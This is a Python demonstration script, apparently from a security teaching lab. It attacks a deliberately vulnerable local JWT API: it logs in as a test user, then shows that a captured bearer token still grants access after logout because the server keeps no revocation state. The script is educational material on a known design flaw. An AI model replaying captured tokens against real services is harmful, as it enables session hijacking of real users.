#!/usr/bin/env python3
"""
Attack: No Revocation - Stolen Token Survives Logout
Target: System 5 vulnerable JWT API (http://localhost:5008)
Demonstrates: The stateless logout paradox done wrong. Logout is client-side
              theatre; a token stolen before logout keeps working after it.
Reference: The core stateless-JWT tension - revocation requires server state.
"""

import requests

TARGET = "http://localhost:5008"


def main():
    print("[*] Attack: token use after logout (no revocation)")
    print("[*] Target:", TARGET)

    r = requests.post(f"{TARGET}/login",
                      json={"username": "alice", "password": "password123"})
    tok = r.json()["access_token"]
    print("[*] alice logs in")

    # Attacker captures the access token while the session is live.
    stolen = tok
    before = requests.get(f"{TARGET}/api/profile",
                          headers={"Authorization": f"Bearer {stolen}"})
    print(f"[*] Stolen token works while logged in -> HTTP {before.status_code}")

    # Victim notices nothing and logs out normally.
    lo = requests.post(f"{TARGET}/logout",
                       headers={"Authorization": f"Bearer {tok}"})
    print(f"[*] Victim logs out -> HTTP {lo.status_code}: {lo.json()['message']}")

    # The whole point: the stolen token should now be dead. It isn't.
    after = requests.get(f"{TARGET}/api/profile",
                         headers={"Authorization": f"Bearer {stolen}"})
    print(f"[*] Stolen token AFTER logout -> HTTP {after.status_code}")

    if before.status_code == 200 and after.status_code == 200:
        print("\n[+] Attack succeeded. Logout changed nothing server-side. A")
        print("    leaked token cannot be called back, because a stateless API")
        print("    holds no record of which tokens are still trusted.")


if __name__ == "__main__":
    main()
